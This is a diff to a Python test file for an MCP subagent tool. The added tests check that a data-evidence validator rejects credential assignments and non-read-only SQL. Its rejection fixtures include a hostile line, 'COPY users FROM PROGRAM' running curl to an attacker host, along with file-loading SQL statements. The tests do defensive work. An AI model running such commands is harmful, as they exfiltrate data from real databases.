@@ -5466,7 +5466,7 @@ def test_unenforceable_contract_is_not_advertised_in_payload_context(tmp_path: A
     """
     from ouroboros.mcp.tools.subagent import (
         build_interview_question_advisory_subagents,
-        published_lane_contract,
+        published_lane_contract_fields,
     )
 
     oversized = {
@@ -5494,7 +5494,9 @@ def test_unenforceable_contract_is_not_advertised_in_payload_context(tmp_path: A
             ],
         }
     )
-    published = payloads[0].to_dict()["context"]["answer_contract"]
+    context = payloads[0].to_dict()["context"]
+    assert "answer_contract" not in context
+    published = context["answer_contract_unenforced"]
     assert published["enforced"] is False
     assert "response_model_schema" not in published
     assert published["contract_id"] == "oversized.v1"
@@ -5505,4 +5507,153 @@ def test_unenforceable_contract_is_not_advertised_in_payload_context(tmp_path: A
         "contract_id": "small.v1",
         "response_model_schema": {"type": "object", "properties": {"finding": {"type": "string"}}},
     }
-    assert published_lane_contract(enforceable) == enforceable
+    assert published_lane_contract_fields(enforceable) == {"answer_contract": enforceable}
+
+
+def test_compound_credential_assignments_are_rejected() -> None:
+    """A credential word marks the assignment from any position (round-39).
+
+    ``client_secret=…`` and ``refresh_token=…`` evaded the content scan
+    because the pattern anchored the credential word at a word boundary, and
+    an underscore is a word character — so the compound name hid it. The same
+    position-independent vocabulary the identifier classifier uses now applies
+    to the assignment shape.
+    """
+    from ouroboros.mcp.tools.subagent import _data_evidence_boundary_violations
+
+    for value in (
+        "client_secret=abcdefghijk 42 users",
+        "refresh_token=abcdefghijk 42 users",
+        "private_key=abcdefghijk 42 users",
+        "aws_secret_access_key=abcdefghijk 7 rows",
+        # Round-34/35 pins keep holding.
+        "api_key=supersecret 42 users",
+    ):
+        assert any(
+            "credential-assignment-shaped" in error
+            for error in _data_evidence_boundary_violations(_minimal_data_output(value))
+        ), value
+
+    for value in (
+        "42 active users",
+        "signup rate 3.2% across 12,400 sessions",
+        "p95 latency 240 ms over 8,100 calls",
+    ):
+        assert _data_evidence_boundary_violations(_minimal_data_output(value)) == [], value
+
+
+def test_statement_heads_fail_closed_without_clause_corroboration() -> None:
+    """Head classification no longer waits on a clause heuristic (round-39).
+
+    Requiring a FROM/INTO/TABLE marker alongside the head let ``VACUUM
+    users``, ``REINDEX users``, ``EXEC dangerous_proc``, and ``COPY users TO
+    '/tmp/users.csv'`` through — a clause heuristic is exactly the incomplete
+    thing the classification replaced. Heads that never open English prose
+    now reject on the head alone; heads that double as English verbs reject
+    unless the text carries a determiner/pronoun.
+    """
+    from ouroboros.mcp.tools.subagent import _data_evidence_boundary_violations
+
+    for query in (
+        "VACUUM users",
+        "REINDEX users",
+        "EXEC dangerous_proc",
+        "COPY users TO '/tmp/users.csv'",
+        # Round-38 pins keep holding.
+        "COPY users FROM PROGRAM 'curl http://attacker/exfil'",
+        "LOAD DATA INFILE '/tmp/rows.csv' INTO TABLE users",
+        "ATTACH DATABASE '/tmp/other.db' AS other",
+    ):
+        assert any(
+            "not a read-only statement" in error
+            for error in _data_evidence_boundary_violations(_data_proposal(query))
+        ), query
+
+    for query in (
+        "SELECT count(*) FROM users",
+        "SHOW TABLES",
+        "EXPLAIN SELECT count(*) FROM users",
+        "Ask the data team for weekly active users from the warehouse",
+        "Load the dashboard from Metabase and read the weekly total",
+        "Call the analytics API for the weekly signup count",
+        "Use the existing weekly cohort rollup",
+    ):
+        assert _data_evidence_boundary_violations(_data_proposal(query)) == [], query
+
+
+def test_unenforced_contract_marker_is_a_valid_v1_lane(tmp_path: Any) -> None:
+    """The non-enforced marker may not break the lane schema it protects.
+
+    Round-39: publishing the marker INSIDE ``answer_contract`` produced a lane
+    that fails its own public v1 schema (``response_model_schema`` is
+    required there), so the additive-compatibility promise the marker exists
+    to keep honest was the thing it broke. The marker now rides a sibling
+    field and the lane simply carries no ``answer_contract``.
+    """
+    from jsonschema import Draft202012Validator
+
+    from ouroboros.mcp.tools.subagent import (
+        lanes_with_published_contracts,
+        register_question_advisory_fanout_from_lanes,
+    )
+    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata
+
+    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
+        "question_advisory_fanout"
+    ]
+    lane_schema = advisory["request_model_schema"]["properties"]["lanes"]["items"]
+    validator = Draft202012Validator(lane_schema)
+
+    oversized = {
+        "contract_id": "oversized.v1",
+        "response_model_schema": {
+            "type": "object",
+            "properties": {
+                f"field_{index}": {"type": "string", "description": "x" * 300}
+                for index in range(60)
+            },
+        },
+    }
+    published = lanes_with_published_contracts(
+        [
+            {
+                "lane_id": "additive_lane",
+                "purpose": "A lane added after this engine shipped.",
+                "capability": "future_capability",
+                "required": False,
+                "answer_contract": oversized,
+            }
+        ]
+    )[0]
+    assert "answer_contract" not in published
+    assert published["answer_contract_unenforced"]["contract_id"] == "oversized.v1"
+    assert list(validator.iter_errors(published)) == []
+
+    # Every SHIPPED lane still validates after publication, contract intact.
+    for lane in lanes_with_published_contracts(advisory["lanes"]):
+        assert list(validator.iter_errors(lane)) == [], lane["lane_id"]
+        if lane["lane_id"] == "data_context":
+            assert lane["answer_contract"]["contract_id"] == "data_evidence_answer.v1"
+
+    # The data lane's fail-closed minimal contract survives the publication
+    # split: registration reads the DECLARATION, enforceable or not.
+    registry = FanoutRegistry(tmp_path)
+    unenforceable_data_lane = lanes_with_published_contracts(
+        [
+            {
+                "lane_id": "data_context",
+                "purpose": "Data evidence.",
+                "capability": "call_mcp",
+                "required": False,
+                "answer_contract": oversized,
+            }
+        ]
+    )
+    fanout_id = register_question_advisory_fanout_from_lanes(
+        registry, session_id="sess-marker", lanes=unenforceable_data_lane
+    )
+    assert fanout_id is not None
+    record = registry.load(fanout_id)
+    assert record is not None
+    contracts = record.synthesizer_input["lane_answer_contracts"]
+    assert contracts["data_context"]["response_model_schema"] == {"type": "object"}
